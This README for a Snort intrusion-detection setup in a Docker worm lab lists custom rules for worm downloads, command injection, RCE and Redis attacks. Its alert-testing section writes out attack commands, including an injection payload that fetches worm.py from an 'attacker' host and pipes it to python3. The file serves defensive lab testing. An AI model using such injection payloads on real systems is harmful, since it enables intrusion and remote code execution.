# Snort IDS Setup for DockerWormNetwork

## Quick Start

```bash
cd /home/greenballoons/499/DockerWormNetwork/docker

# Build and start all services including Snort
docker-compose up --build -d

# View Snort logs in real-time
docker logs -f ids

# Or watch the alert log file
tail -f ids/logs/alert.log
```

## Rule Coverage

The `local.rules` file detects:

| SID | Description |
|-----|-------------|
| 1000001 | Worm downloading worm.py |
| 1000002 | curl piped to python3 execution |
| 1000010-1000013 | Command injection in /ping endpoint |
| 1000020-1000021 | RCE via /exec endpoint |
| 1000030-1000032 | Redis exploitation attempts |
| 1000040-1000044 | Port scanning detection |

## Testing Alerts

Trigger specific alerts:

```bash
# Command injection (SID 1000010)
curl "http://webserver/ping?ip=;curl%20http://attacker/worm.py|python3"

# Worm download (SID 1000001)
curl http://webserver:8080/worm.py

# RCE endpoint (SID 1000020)
curl -X POST http://webserver/exec -d "id"
```

## Troubleshooting

**Snort won't start:**
```bash
# Check if capabilities are set
docker run --rm --cap-add=NET_RAW --cap-add=NET_ADMIN jasonish/snort:latest snort -V

# View Snort debug output
docker-compose logs ids
```

**No alerts generated:**
- Verify services are on the same Docker network
- Check that `micro_internet` is not marked `internal: true`
- Ensure ports match in rules vs actual traffic

## File Structure

```
docker/ids/
├── rules/
│   ├── local.rules          # Custom detection rules
│   └── snort-local.conf     # Snort configuration
├── logs/
│   └── alert.log            # Generated alerts
└── README.md                # This file
```

## Customizing Rules

Edit `rules/local.rules` and restart:
```bash
docker-compose restart ids
```

## References

- [Snort Rule Writing](https://docs.snort.org/rules/intro)
- [Snort 2.9 Manual](https://www.snort.org/documents/snort-users-manual)

